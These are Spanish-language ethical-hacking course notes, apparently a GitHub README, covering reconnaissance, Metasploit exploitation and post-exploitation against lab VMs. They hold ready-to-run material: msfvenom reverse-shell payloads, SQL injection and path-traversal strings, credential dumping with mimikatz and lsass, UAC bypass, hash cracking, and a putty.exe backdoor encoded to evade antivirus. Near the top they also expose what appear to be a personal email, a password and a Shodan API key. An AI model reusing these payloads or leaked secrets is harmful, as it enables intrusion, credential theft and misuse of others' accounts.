# Estudios-de-ciberseguridad-y-hacking-tico.
Estudios desde lo básico hasta lo avanzado dentro del mundo de la ciberseguridad.

Recordar siempre antes de comenzar cualquier trabajo de hacking etico que todo lo se vaya a realizar sea mediante un contrato y firmado por el cliente como representante del proyecto
Leer bien las politicas de la empresa para no contradecir los procedimientos

sudo dpkg-reconfigure locales - para cambiar idioma de interfaz
setxkbmap es - para cambiar idioma del  teclado a espanol(es)
shramos en github para ver los repositoios del profesor santiago
site:pagina y lo que quiero buscar, site solo buscara dentro del navegador todo de udemy.com
filetype para buscar lo que quiero buscar de udemy filetype:pdf por ejemplo
usar dobles comillas"" para espesificar las cadenas como por ejemplo site:udemy.com "Cursos de lo que sea"
tambien usar parentesis para decir que busque dentro de "" esas palabras por ejemplo (curso|pass) para que busque exactamente lo de parentesis'|= significa 'O'
inurl:index.php?id=  (inurl)para entrar al link de ese tipo de las paginas
allintitle: para que este como titulo en la busqueda
goole dork se llama la busqueda en la pagina google hacking database, son busquedas hacking pasivas, que en un momento dado google las anexo y ya no sean berilicas y esten desactualizadas
ext: para el tipo de extension como txt
intext:"@pagina web"
intext: "password" intext para describir que buscamos
inurl:/file/ tipo de infromacion como lo es file o podria ser otro
shodan es una pagina para buscar servicios o puertos abiertos en linea 
cuenta: user:juan slam correo windows live juanslam6@hotmail.com brainpool42 270195
country: pais donde se buscara
port: puerto que deseamos
org:"para anadir empresa o institucion que deseemos buscar"
https://github.com/jakejarvis/awesome-shodan-queries#webcams para webcams
API Key: cbBwr9m1SlkHtjij9b9ut7dNRq0nukH8
metagoofil -h para metadatos
metashield analyzer mas igual que foca que metagoofil pero en la web
cve - pagina o mas bien base de datos donde las vurnerabilidades encontradas en diferentes empresas son publicada y se le asiga un numero que mayormente se reconocen de esa forma
para identificar si nuestro producto a raiz de nuestro analisis tiene vurnerabilidad esta pagina quizas lo tenga ademas tiene la opcion de indicarnos a traves
del codio de la vurnerabilidad que se le asigna el nivel de vurnerabilidad y todos los que tiene



transformadores son las herramientas como maltego, que son consultas que pasa la informacion en datos, se ejecutan en dferentes base de datos y entidades



archive.org - se realiza busqueda de paginas desde sus inicios hasta la actualidad y podemos ver como era antes y la informacion de aquel entonces


recon-ng para hacer funciones como maltego
para buscar modulos marketplace search
luego seleccione especificamente marketplace search whois para instalar
marketplace inf y el modulo para su infromacion
para instalar es marketplace install y el modulo que guste
luego modules load y el nombre del modulo para asi estar dentro y poder trabajar con el
options set SOURCE y el dominio que queramos investigar
ya el mudolu tendria cargado el dominio y solo de ejecutar el comando run este empezaria a trabajar
key add shodan_api y la key esto para instalar un modulo que requiera key como lo es shodan una vez instalado colocamos el comando ingresamos la key y listo
ctrl+l para limpiar pantalla +c para retroceder

metagoofil para metadatos en kali linux metagoofil site:dominio pero no estan actualizada
foca para windows

cuando ordenadores comparten la misma red se llaman nodo

AXFR es un tipo de transacción de DNS que se utiliza para replicar bases de datos DNS
 a través de un conjunto de servidores DNS 1. Es una de las varias formas disponibles para los administradores de 
sistemas para replicar bases de datos DNS. AXFR es una abreviatura de “Asynchronous Full Transfer” 1

Nmap: Estados de los puertos
Estados en los que pueden encontrarse los puertos:

abierto

Una aplicación acepta activamente conexiones TCP, datagramas UDP o asociaciones SCTP en este puerto. Encontrarlos suele ser el objetivo principal del escaneo de puertos. Las personas preocupadas por la seguridad saben que cada puerto abierto es una vía de ataque. Los atacantes y los evaluadores quieren explotar los puertos abiertos, mientras que los administradores intentan cerrarlos o protegerlos con firewalls sin frustrar a los usuarios legítimos. Los puertos abiertos también son interesantes para análisis no relacionados con la seguridad porque muestran los servicios disponibles para su uso en la red.

cerrado

Se puede acceder a un puerto cerrado (recibe y responde a paquetes de sonda Nmap), pero no hay ninguna aplicación escuchando en él. Pueden ser útiles para mostrar que un host tiene una dirección IP activa (descubrimiento de host o escaneo de ping) y como parte de la detección del sistema operativo. Debido a que se puede acceder a los puertos cerrados, puede que valga la pena escanearlos más tarde en caso de que alguno se abra. Es posible que los administradores quieran considerar bloquear dichos puertos con un firewall. Luego aparecerían en el estado filtrado, que se analiza a continuación.

filtrado

Nmap no puede determinar si el puerto está abierto porque el filtrado de paquetes impide que sus sondas lleguen al puerto. El filtrado podría realizarse desde un dispositivo de firewall dedicado, reglas de enrutador o software de firewall basado en host. Estos puertos frustran a los atacantes porque proporcionan muy poca información. A veces responden con mensajes de error ICMP como el código 13 de tipo 3 (destino inalcanzable: comunicación prohibida administrativamente), pero los filtros que simplemente descartan sondas sin responder son mucho más comunes. Esto obliga a Nmap a reintentar varias veces en caso de que la sonda se abandonara debido a la congestión de la red en lugar de al filtrado. Esto ralentiza drásticamente el escaneo.

sin filtrar

El estado sin filtrar significa que se puede acceder a un puerto, pero Nmap no puede determinar si está abierto o cerrado. Sólo el análisis ACK, que se utiliza para asignar conjuntos de reglas de firewall, clasifica los puertos en este estado. Escanear puertos sin filtrar con otros tipos de escaneo, como escaneo de Windows, escaneo SYN o escaneo FIN, puede ayudar a determinar si el puerto está abierto.

abierto|filtrado

Nmap coloca los puertos en este estado cuando no puede determinar si un puerto está abierto o filtrado. Esto ocurre para tipos de escaneo en los que los puertos abiertos no dan respuesta. La falta de respuesta también podría significar que un filtro de paquetes abandonó la sonda o cualquier respuesta que provocara. Por lo tanto, Nmap no sabe con certeza si el puerto está abierto o está siendo filtrado. Los escaneos UDP, protocolo IP, FIN, NULL y Xmas clasifican los puertos de esta manera.

cerrado|filtrado

Este estado se utiliza cuando Nmap no puede determinar si un puerto está cerrado o filtrado. Sólo se utiliza para el análisis inactivo de ID de IP.

para la explotacion usamos cmd sobre el link que nos muestra al explotar

CVE pagina internacional donde todos los hacker suben a la nube vurnerabilidades encontradas y que nosotros podemos filtrar la que encontramos a traves del 
nombre del puerto y version en este caso ProFTPD 1.3.5 y nos dira si las tiene, estas vurnerabilidades le seran asignadas codigos para identificarlos
luego de la busqueda nos dira algunas referencias de la vurnerabilidad y dentro de ella algunas opciones de como explotarlo, tambien en la 
descripcion el modulo o mod para hacer una busqueda en el navegador y buscar otros repositorios por ejemplo el siguiente mensaje que lo busca que sea escrito por python

en el repositorio CVE luego de colocar el puerto abierto y encontremos una brecha en la descripcion nos dara una forma de explotarlo que lo podemos buscar en internet
por ejemplo en el puerto ProFTPD 1.3.5 mod copy exec python
esto nos ayudara para ver en base de datos demas usuarios que hallan encontrado esta misma vurnerabilidad y por ejemplo en github podemos encontrar mas informacion de esta

CVSS Scores dentro de la pagina CVE en la opcion de vurnerabilidades ingresar el codigo del error que sera CVE y numeros que sera la vurnerabilidad del puerto y version anterior
esto nos dira si es base, media o critica la vurnerabilidad, lo que afecta del software y los programas que resultan afectados

CVE details este hace todo lo anterior en una sola pagina, te dice el nivel de amenaza, en esta se coloca el producto OpenSSh 6.6.1 y nos indica algunos repositorios con la misma descripcion
sus vulnerabilidad, productos afectados

vuln
Estos scripts comprueban si hay vulnerabilidades conocidas específicas y Por lo general, solo informa de los resultados si se encuentran. Algunos ejemplos son realvnc-auth-bypass y afp-path-vuln.

para abrir los plugins que son herramientas para trabajar con las vulnerabilidades utilizamos la herramienta instalada emacs

para buscar en internet una vurnerabilidad y trabajarla podemos tomar una parte del el por ejemplo en tcp aparece un puerto abierto con el error llamado mir por ejemplo 
en el navegador para un plugin creado en github seria mir exploit python

netcat en terminal nc funciona para realizar conectividad entre maquinas a traves de puertos por ejemplo nc -l -p 4444
y otro terminal nc localhost 4444 , todo lo que escriba aparecera en el primer terminal igualmente, al igual que si abrimos wireshark 
veremos desde el punto de host principal hasta donde se envia mas todas las informaciones indicandonos el host 4444 mas los mensajes
si entramos a loopback en wireshark

para elmininar la marca de agua en un informe buscar con ctrl f watermark y precionar enter para ver las busquedas

para ejecutar una penetracion 1er eliminar los iptables, dentros de los plugin colocar la ip y puerto de la maquina de donde estamos atacando
luego preprarar nuestro nc -l -p con el puerto que le colocamos al plugin diciendole que ese es nuestro puerto y que conecte a la otra maquina a ese puerto
luego seria ejecutar el plugin ./plugin ip de la maquina que atacamos y el puerto que tiene la vurnerabilidad mas playload o patch dependiendo el plugin que 
hayamos descargado

metasploit
connect realia la misma fucnion que netcar a diferecia que solo la ip mas el puerto solamente
search mas el nombre del exploit, funciona para que dentro de su base de datos encuentre los diferentes plugins con el nombre que buscamos y su version
luego utilizamos el comando 'use' mas el nombre o la direccion en este caso que tendra el exploit para usar el mismo
Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD   aqui se va a colocar el comando que deseas explotar en la maquina que se atacara por ejemplo ls para visualizar datos

metasploit
utilizamos search buscamos la vulnerabilidad, utilizamos use mas la direccion de esta y con show options verificamos que necesita para ejecutarce
podemos usar un exploit show payloads elegimos igualmente con use y direccion de este otra vez show options para configurarlo y por ultimo exploit para atacar
unas de las razones si nos aparece que se exploto pero no se creo ninguna seccion puede ser por que sitepatch no tenga permiso en ese caso seria
set sitepatch var/www/html
sessions para ver las secciones que estan abiertas
sessions -k mas el numero de la seccion que quieres cerrar

/var/www/html, es el directorio estándar donde se almacenan los archivos que un servidor de aplicación

msfvenom 'payload'-p 'lenguaje de eleccion'python/'nombre del payload'shell_reverse_tcp lhost=192.168.56.102 lport=2222 ejemplo de como nos conectamos a nuestra 
propia maquina y nos muestra el payload el cual lo podemos anadir a un exploit y ejecutarlo a nuestra eleccion
cuando entremos a x exploit emac exploitx podemos comentar el que este # y colocamos nuestro nombre puede ser payload_python seguir el mismo padron
que los demas payolad luego del nombre y luego pegar los que nos arrojo msfvenom y en cada ' colocar antes \   codigo'ejemplo = codigo\'ejemplo para que no se lean
las comillas, al inicio colcar " antes de pegar y al final "'
para el cual luego vamos a donde esta el exploit editado colocamos ./exploitx.py 192.168.56.104 6667 -payload python 
y en entro entorno colocar la linea de donde recibiremos la confirmacion nc -l -p 2222 y ya con un ls verificamos que ya estamos dentro de la maquina
en este caso la maquina ubuntu, editamos el exploit con otro payload le colocamos nuestra direcion y luego explotamos con la direccion de la maquina objetivo

Si un payload es muy largo lo cambiamos a msfvenom -p python/meterpreter/reverse_http lhost=192.168.56.102 lport=2222, en vez de meterpreter_reverse_tcp
he colocado meterpreter/reverse_tcp o http para uno mas corto de lo contrario seria tedioso

formas de entrar al sistema
ls /home/usuario
cat /home/usuario/fchero que queremos ver
ls /usr para algunos sistemas operativos o cd /usr
cat /etc/passwd para ver sus credenciales

alt+X para reemplzarar del payload las ' por \'
replace-string luego ' luego \' se presiona enter lego de replace-string se coloca ' y luego \' y todo esto teniendo el payload sombreado

Si creamos un payload dentro de un exploit tipo meterpreter hacer mas fuerte necesitaremos a metaploist y de este hacer un handler
que es a traves del comando use exploit/multi/handler que es como un exploit para recibir senal
los configuramos con show options con el puerto que colocamos al crear el payload
luego colocar el payload creado set payload python/meterpreter/reverse_http y luego exploit 
esto se quedara escuchando
Ya en la otra terminal ./exploit.py y el objetivo
ahora en metaploist ls y lo que deseemos atacar

para crear un fichero con el payload anterior pero en este caso en vez de python es windows y -f para formato > nombre de este
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.109 lport=4444 -f exe > prueba, para escuchar desde nuestra maquina principal
tambien creamos un simple payload para nuestra maquina principal kali
msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.56.109 lport=4444, para crear payload

Burpsuite es un proxy de intercepsion, de mi maquina y otra que interfiero para ver su ruta dentro de la red
En la parte de proxy configuracion podemos utilizar match and replace rules para cambiar en tiempo real
las direcciones del servidor, por ejemplo si recibo un user agent puedo cambiar su curso a otra direccion que desee

en el apartado taget y debajo sitemap podemos escuchar la maquina que esta configurada con nuestro proxy en este caso 127.0.0.1 puerto 8080
podemos ver a donde se dirige el usuario y sus peticiones al igual que los datos que utiliza como en el ejemplo de multillidae sus credenciales

Skipfish
Hace algunas tareas de burpsuite
En tal caso es que -Y -O para que el escaner a x pagina web no sea tan intrusiva
Este seria la primera fase para la explotavilidad de vulnerabilidades en aplicaciones web
seria skipsifh -YO -o + direccion de la carpeta para guardar los ficheros + 'dominio'
antes de la parte de arriba se debe crear una carpeta mkdir Desktop/ejemplo
y luego skipfish -YO -o Desktop/ejemplo dominio
luego de esto te creara un archivo.html con el scanner realizado hacia el dominio que hemos colocado

Probar vulnerabilidades a traves de injection sql
en este caso la vulnerabilidad es en mysql ya que realizaron la creacion de username de forma erronea
puedo hacer por ejemplo en usernmae e introducir alberto' donde habra una comilla simble de mas dentro de la base de datos por la mala sintaxis
' or 1=1 -- y espacop, --que significa el modo de comentar en mysql, 'or 1=1 siempre sera verdadero, con esto le exijo que me muestre todos los usuarios de su base de datos

Injectio SQL
Vulnerabilidades en una pagina web
Lo primero es colocando un caracter especial en un campo como name por ejemplo, puede ser ',(,), entre otros
se debe a la mala practica del programador, los caracteres especiales se introducen cuando sospechamos que dentro hay una llamada al name en la base de datos
una linea de busqueda es donde aprovechamos, otras veces el codigo en sql lleva WHERE username=''' , en ese caso si colocamos ' or 1=1 -- , esto nos logeara en el primer usuario
al contrario de WHERE username='' , que ' or 1=1 -- , hacia la funcion de presentarnos todos los usuarios por la diferencia de "''" comillas simples.
Podemos hacer pruebas sabiendo que base de datos atacamos, ya sea sql,mysql,post etc y saber las columnas de este para poder rellenarlas con null mientras hacemos nuestra sentencia de codigos

se utiliza sqlmap para ver las vulnerabilidades en los logins de paginas webs, a traves a como se le llama injection sql
sqlmap -r url de la pagina que hagamos la prueba
En este caso copiamos la capture de burpsuite cuando nos logeamos con nuestro usuario y antes de presionar forward copiamos lo presentado y click derecho en copy file
para exportar en un archivo con el nombre prueba-burpsuite.txt
sqlmap -r prueba-burpsuite.txt --ignore-redirects --technique B -p username --current-user
con este comando primero --ignaramos la redireccion que hara cuando nos loguiemos luego utilizamos tecnica B y luego nos centramos en -p usuario u --current-user

sqlmap -r prueba-burpsuite.txt --ignore-redirects --batch --technique B -p username -U root@localhost --passwords
--batch para que no nos presenta mas opciones mas de las que les solicitamos
' union select null,database(),null,null,null,null,null -- con esto puedo saber como se llama la base de datos
-- se utiliza en mysql para comentar
http://192.168.56.108/mutillidae/index.php?page=../../../../../etc/passwd, despues de page= le injecto un comando para que me muestre las claves
para windows seria \ y el archivo que se desee encontrar 
verificar los payloads , ya que si el la pagina o aplicacion web esta utilizando saltos debemos de codificar nuestro payload a url en burp-suite, de igual forma
si vemos que esta escrito utilizando comillas "" y nuestro payloads '' debemos de adaptarlo para que se ejecute
recordando que esta vulnerabilidad no es bien vista colocarla en un informe de auditoria
por eso debemos de explotarla en su totalidad y havcer ver que es de nivel critico, puedo forzar a un usuario a realizar una accion dentro de la aplicacion
como que realice alguna publicacion o que cree una cuenta, todo esto por detras sin que se percate

tambien usando otra herramienta de github podemos hacer lo anterior solamente colocando -u o -url mas el link o --data para POST
sudo python3 xsstrike.py -u "http://192.168.56.108/mutillidae/index.php?page=user-info.php" --timeout 50
la herramienta es xsstrike ubicada en este caso en home, una vez dentro podemos hacer lo anterior

otras formas es realizar atraves de burp-suite una explotacion a traves de las cookies, por ejemplo en mutillidae el usuario santiago pertenece a usarname=santiago
pero en uid=25 , este uid identifica a los usuarios , si cambiamos santiago por ejemplo a admin la pagina se actualizara y volvera al nombre santiago
sin embargo si cambiamos los valores de uid de 25 a 1 que por sentido logico vemos que la pagina asigna esta numeracion en orden se vayan creando, podemos cambiando a 
el valor 1 la cuenta admin

bettercap
para iniciar sudo bettercap
para iniciar un modulo help mas el nombre del modulo para ver las especificaciones
help para ver cuales estan activas y cuales no.

cambiar ip en modo nat en kali
sudo nano /etc/network/interfaces
auto eth0
iface eth0 inet static
    address 10.0.2.20  # Puedes elegir una dirección IP dentro del rango de tu red NAT
    netmask 255.255.255.0
    gateway 10.0.2.2    # Esto suele ser la dirección IP del router virtual en la red NAT

arp spoof
bettercap, utilizaremos en el la herramienta spoof, esta lo que hara es que cuando la victima haga una solicitud por ejemplo en google, google nos
enviara su solicitud y nos enviara su resultado y luego nosotros le enviaremos lo que queramos o lo que busco
esto hara que la ip asociada a la maquina de la victima este vinculada a la ip fisica del atacante, cualquier solicitud sera con la ip de la victima
En resultado envenanamos la cache de la maquina victima ya que la cache que guarda la informacion para un proximo uso como podria ser las cookies en 
una app web,esto hara que la maquina victima reconozca como ip fisica nuestra maquina atacante.
todo eso mediante set arp.spoof.targets ip de la maquina victima y luego arp.spoof on , para iniciar


polymorph - no funciona verificar, funciona para interceptar y editar los datos de la red de las ip configuradas
utiliza dos ip, esto quiere decir que vera lo que una le envia a la otra, editar los datos en este caso utilizando
python y emacs, video 91
tab - para ver los comandos
-t - es targets
-g - gateway puerta de enlace
-f - protocolos
spoof -t ip -g ip , cada ip perteneciente a maquina virtual para interceptar los datos de una enviados a la otra
capture -f en este caso capturar los protocolos icmp
si abrimos primero wireshark podremos ver el trafico completo como winreg entre las dos maquinas que visualizamos 
en polymorph, esto debe de estar en modo puente 'bridge'en el adaptador
tener en cuenta siempre la conexion de las maquinas entre si, ya que si esta no muestra el resultado esperado deberemos 
de cambiar el adaptador de red al mas conveniente
despues de capturar en este caso capture -f winerg, escribimos show
nos mostrara todos los paquetes capturados e ingresamos wireshark para visualizar graficamente y buscar mas rapido el 
paquete en este caso seria el penultimo ya que seria el dato editado
luego lo elegimos template y si son 300 el penultimo es 299, 
template 299 luego vemos dentro del paquete con show
dump dentro para visualizar el paquete , su contenido que a simplemente no muestra

Meterpreter dentro de metasploit

En esta interacion editamos un exploit, en este caso en conjunto con python, tambien creamos el payload
msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.56.109 lport=4444, para crear payload, en este caso presentaba que no tenia persmiso 
al ejecutar ./exploit ip port -payload python, use chmod 777 y el archivo exploit.py en este caso, dentro de meterpreter realice un comando
comun para escuchar cuando envieme el ataqueen este caso es use exploit/multi/handler a esto se le llama lisener para escuchar lo que interceptamos,
en caso de algunas maquinas quitar medidas como la metasploitable ubuntu que debo de eliminar las iptables -S tenerlo en cuentas en otras cuentas
luego lo editamos para que nuestra maquina escuche cuando el exploit acierte a la otra maquina
en este caso el host de nuestra maquina, ya sabemos que es set lhost ip de la maquina y puerto de siempre que es 4444
tambien colocarle el payoload que utilizamos en este caso creamos un meterpreter ya sabemos cual es la funcion de este
decimos que set payload python/meterpreter/reverse_tcp luego de explotar y luego de tener una session , background, back y luego un payload dependiendo la maquina,
por ejemplo linux ubuntu set payload linux/x86 o x64/ meterpreter/reverse_tcp y tener pendiente los puerto para cambiarlos para que no esten todos iguales
algunas opciones como show payloads o show options para ver mas opciones y por ultimo exploit para empezar a escuchar
desde la maquina que editamos o realizamos el exploit ejecutamos lo sguiente dentro de la carpeta donde este se encuentre
./exploit.py en este caso trabajamos con python por eso el .py luego la ip de la maquina victima mas el puerto afectado -payload python
ya con esto le enviamos el ataque y podemos y a meterpreter a verificar si ya este esta escuchando
podemos utilizar el comando getuid para saber que tipo de usuario somos
luego de estar dentro de la maquina en otra terminal ejecutamos /usr/share/metasploit-framework
ahi dentro elegimos modules luego post y elegimos el sistema operatico al cual atacamos, en este caso es maquina ubunto metasploitable
seleccionamos linux, y dentro podemos ver diferentes opciones con diferentes exploit ya una vez dentro que podriamos considerar como exploit
para utilizarlos estos exploit solamente usamos run +la direccion de este y escribir el exploit hasta el punto, ejemplo, prueba.bn
seria en este caso run post/linux/gather/prueba y enter, gather es la opcion dentro de linux que esta vez usamos, prueba esta dentro de gather
por ejemplo run post/linux/gather/hashdump > para ver las credenciales de la maquina victima

como podemos salir del meterpreter ya dentro para ejecutar otro exploit pero no perder el que tenemos, utilizamos background, y ya fuera consultamos
sessions y vemos nuestro usuario explotado de la otra maquina en segundo plano

para ver modulo que es un recomendador de exploit ingresamos a use post/multi/recon/local_exploit_suggester
y vemos las opciones con show options
en este caso solo tenemos una session que es la anteriror meterpreter en segundo plano que utilizando sessions la podemos visualizar y 
con ella el numedo que como es una sola representa el #1, dentro del modulo anterior ingresamos esta session, set session 1 y luego de enter
exploit y enter para visualizar todos los exploit compatibles con la maquina victima

dentro veremos exploit con direccion local esto significa que debemos ya de haber penetrado la maquina victima para poder ejecutarlo sobre la maquina victima
de esta forma podemos aumentar nuestro privilegio dentro la maquina victima, una vez dentro de un exploit local en el caso de la maquina ubunto metasploitable
tiene instalado docker y tiene una brecha vulnerable y usamos el exploit docker_contain_privilegios, por ejemplo
este nos pedira una session como ya dijimos exploit local se usa ya que estamos dentro de la maquina victima, tambien nos pedira lhost y tambien en este paso
colocamos un payloads parecido al que usamos, set payload linux/x86/meterpreter/reverse_tcp, que es mas parecido a la maquina ubuntu
y exploit y usando el comando que ya conocemos para ver nuestro tipo de usuario vemos que somos root, usando getuid
A esto se le llama post-explotacion ya una vez dentro continuamos y subimos de privilegios para ataques mas comprometidos e informacion mas 
priviligiada

para usar web_delivery dentro de metasploit en este caso para windows 10

use exploit/multi/script/web_delivery
dentro podemos ver show options y a diferecia de los demas exploit este nos eligira de forma automatica el payloads para el sistema de la victima
usamos show targets para ver las diferentes opciones y como es para sistema windows selecionaremos power shell que es PSH
set target 2 o el numero que este indique luego indicamos el payload set payload windows/x64/meterpreter/reverse_tcp
recordando x64 sistema 64 bits en ubuntu colocamos x86 cuando son de 32 bits
getsystem -h, para ver como este comando intentara elevar sus privilegios, cabe destacar que este comando es para sistemas windows
una vez penetrada la maquina windows ya sea ingresando manualmente el codigo arrojado por meterpreter o un ejecutable ingresamos sessions 1
ahora realizamos lo anterior que con la maquina ubuntus, levantaremos una pos-explotacion y accederemos a que el ususario obtenga mayor
acceso convirtiendolo en administrador, getsystem -h para windows ofreciodo por meterpreter en este caso no nos funciono,
una vez dentro en meterpreter recordar siempre abirir otra terminal e ingresar a los modulos para vizualizar que podemos utilizar
cd /usr/share/metasploit-framework, una vez con las opciones a simple vista elegimos la mas adecuada, al colocar run para empezar a
ingresar un modulo u otra herramienta colocamos la direccion luego de /usr/share/metasploit-framework/modules u otra opcion,
si entramos a post seria run post/y lo demas en este caso ingresamos a run post/windows/gather/checkvm , dentro de post,
luego windows luego gather y la opcion se llama checkvm esta opcion es muy importante, sabremos si la maquina victima es fisica o virtual

Otro muy bueno es run post/windows/gather/credentials/credential_collector
necesitara que seamos administradores pero como dice el nombre nos entregara las credenciales de la victima
run post/windows/gather/enum_shares, este nos muestra si esa maquina virtual tiene alguna carpeta compartida
y otro es el run post/windows/gather/hashdump  para volcar los hash de la memoria de la maquina victima
igual que anteriormente, ingresamos background, ingresamos use post/multi/recon/local_exolit_suggester
que es para elevar el permiso al usuario este exploit, ingresamos show options, verificamos que numero
es la session que dejamos anteriormente con background y decimos set session en este caso 2 y exploit
local_exolit_suggester esto nos sugiere los exploit para lo que queremos en este caso elevar el permiso a administrador
luego de esto elegimos el exploit nos los senalara mas abajo en verde, deciemos use exploit/ejemplo/ejemplo lo configuramos con show options
target,lhost,session y luego exploit

Ahora intentaremos otra forma de elevar los permisos
ya que la anterior no nos funciono en windows utlizaremos los conocidos exploit bypass, estos simplemente omiten la ventanita de administrador
la ventana que sale cuando hacemos click en una programa por ejemplo y este tiene por defecto el pequeno escudo de administrador
ese programa que debes de aceptar si deseas continuas exacto, bypass omite esa ventana y ejecutamos el programas de forma inmediata
lo podemos encontrar escribiendo search uac, decimos entonces use y el numero de exploit en este caso 13 lo configuramos y explotamos
en este caso segui intentando hasta conseguirlo con otro exploit, debe de decirme cuando finalice que estoy en el grupo de administrador
y que tenemos dos sessiones , ya digo esto de ante mano porque si ingresamos getuid seguiremos con el mismo usuario pero en este caso
no importa ya explique como funciona bypass y si nos dice que estamos en el grupo de administrador es claro que lo estamos.
y podemos comprobar con getsystem no los confirmara y si volvemos luego de eso a getuid veremos que si somos administradores,

mimikatz o kiwi como se llamada en meterpreter

esta herramienta nos ayuda a reversas las credenciales de la maquina explotada

una vez dentro de meterpreter ingresamos load kiwi para que la herramiente se active y luego help kiwi para ver las opciones
en este caso creds_all para ver todas sus credenciales pero en este caso estan hasheadas es decir, codificadas
luego ingrese kiwi_cmd sekurlsa::logonpasswords para poder ver mas informacion acerca de las credenciales y mas
utilizaremos para eso un diccionario llamada john , el cual tratara de decifrar el hash de nuestra contrasena
primero creando un echo "hash de nuestra passord" > hash.ntlm, recordando que es ntlm 
algunas veces darle permiso al archivo creado y luego sudo john --format=NT --incremental hash.ntlm esto decifrara la contrasena
y luego john hash.ntlm --format=NT --show la mostrara cada vez que ingrese el comando, en cambio john --format=NT --incremental hash.ntlm solo la mostrara una sola vez
cuando la decifre las proximas veces dira que ya se decifro y que utilices ql comando para mostrar
tambien con permisos por cualquier error al no encontrarla, tener en cuenta que se debe de tomar el ultimo ntlm, 
otro comando de kiwi seria password_change, como el nombre lo dice cambiar la clave de la maquina victima
colocamos password_change options y vemos los requisitos para aquello en este caso seria -P para clave nueva -p para clave vieja y -u para nombre de usuario
password_change -P 1410 -p aeiou -u kali
otro es usando un diccionario aparte y usarlo en conjunto, en este caso descargue rockyou en el repositorio de github
john --format=NT --wordlist=~/Downlowad/rockyou.txt ~/Desktop/clave.ntlm, formarto nt que es ntml tipo de archivo de nuestro fichero con el hash,
wordlist nuesta listas de palabras y su direccion y direccion de nuestro fichero que en este caso se llama clave.ntlm 
Otro comando puede ser --fork=4 esto usara mis 4 nucleos para hacer las descriptacion en paralelo(SI tienes mas nucleo aumenta)

otra forma para no levantar mucho la atencion ya que john para el hash lo hace bastante seria una vez dentro de la maquina victima en este caso
una maquina con windows 10, seria entrar a administrador de tareas, detalles, buscar lsass y click derecho volcar archivo para luego
llevarlo a nuestro laboratorio para hashearlo
esta forma conlleva a descargar en la maquina victima doctumb sysinternal, luego Procdump>procdump64.exe -accepteula -ma lsass.exe lsass.dmp en cmd
ya suponiendo que tenemos el acceso a administrador, esto funciona en diferentes sistemas operativos que no utlizan windows defender y 
en muchas organizaciones que utilizan antivirus privados.
todo esto de hash son volcados de la memoria de donde obtenemos por lo que hemos visto hasta aqui credenciales de la maquina por ende del usuario

Otra herramienta al igual de john es hashcat
Antes que todo explicar que un hash es una fucion criptografica que recibe nuestra contrasena y nos devuelve un valor cifrado
 echo -n "1234" | md5sum | cut -f 1 -d " " > hash.md5 creamos un hash nuestra contrasena 1234 pasara a ser 81dc9bdb52d04dc20036dbd8313ed055
md5sum es una funcion de kali que calcula nuestra clave 1234 para md5 y luego se la pasa a cut -f 1 -d " " que lo que hace es que al pasarla s agrega un guion -
y un espacio y lo que hace es eliminarlo y dejar nuestro hash limpio para decirlo de una forma
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.md5, descomprimimos rockyou.txt.gz, ingresamos el comando anterior y le
indicamos la direccion hacia rockyou.txt y luego el fichero con la contrasena haseada, debemos de estar en la terminal donde se encientra el fichero hash.md5
luego de decifrar con el comando anterior lo podemos seguir viendo con john hash.md5 --format=raw-md5 --show, recordar con raw-md5 porque lo hacemos
con un fichero .md5, si fuera ntlm fuera =NT.
para usar hashcat y usarlo para decifrar diferentes claves como las dos anteriores revisar en su repositorio en wipkipedia, son bastantes 
por ejemplo md5 es el numero 0 un shad256 por ejemplo es 1400 para dar un ejemplo, https://hashcat.net/wiki/doku.php?id=example_hashes para mas informacion
hashcat -m 0 -a 0 hash.md5 /usr/share/wordlists/rockyou.txt
que dice lo anterior -m el tipo de hash en este caso md5 y ya sabemos que pertenece al valor 0 y -a la herramienta a utilizar en este caso colocamos 0 que significa
utilizaremos wordlists, direccion de wordlists mas el diccionario en este caso rockyou.txt si fuera fuerza bruta 'Brute-Force' seria -a 3
luego para verla decifrada al igual que con john hash utiliza hashcat -m 0 -a 0 hash.md5 --show  para continuar viendola cuando nos plasca.
En caso de fuerza bruta solo hashcat -m 0 -a 3 y fichero.md5 y para mostrar igual y al final --show

Esto lo aplicamos en una maquina virtual, la atacamos ya dentro y siendo root ingresamos post/linux/gather/hashdump para ver el usuario, en este caso atacamos
la maquina ubuntu metasploitable, nos presenta lo siguiente> $6$NABMNgxO$T2lvEhArjOImjvROySq8vka/r8MWhhzNgT3Z5FS1LcPS5D325ESK5LjFJymb2jo
$6% nos dice que tipo de hash es, en este caso es sha512, ya sabiendo esto podemos utilizar en este caso -m 1800
Al momento de intentar hashearlo primero creamos un fichero .txt con el siguiente hash
vagrant:$6$NABMNgxO$T2lvEhArjOImjvROySq8vka/r8MWhhzNgT3Z5FS1LcPS5D325ESK5LjFJymb2jo/m4NmDg8aEl0TWWI3la.Y3/:900:900:vagrant,,,:/home/vagrant:/bin/bash
en caso de john seria john fichero creado y listo y para segir viendo ya sabes lo mismo pero --show al final y nos dice los detalles del tipo de hash
en este caso (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) john --format=sha512crypt hashdump.txt nos ayuda para saber el format que es el tipo de hash
con hashcat seria editar el hash hasta dejarlo asi $6$NABMNgxO$T2lvEhArjOImjvROySq8vka/r8MWhhzNgT3Z5FS1LcPS5D325ESK5LjFJymb2jo/m4NmDg8aEl0TWWI3la.Y3/
seria borrar el usuario que empieze por $6$ y que termine en los ultimos : dos puntos borramos los ultimos dos puntos y ahi nos detenemos
luego hashcat -m 1800 -a 0 hashdump.txt /usr/share/wordlists/rockyou.txt y hashcat -m 1800 -a 0 hashdump.txt /usr/share/wordlists/rockyou.txt --show
al igual que john fichero te dice el tipo de hash como por ejemplo > detected hash type "md5crypt"


Herramienta putty
luego de instalarla wget mas link de la pagina
backdoors en binarios
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.56.109 lport=4000
-e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttX.exe , -a arquitectura de la maquina victima, --platform el sistema operativo de la victima
-x archivo que se le enviara -p payloads para enviar a la victima, -e para codificar el payload, -i le decimos que de 3 vueltas de codificacion,
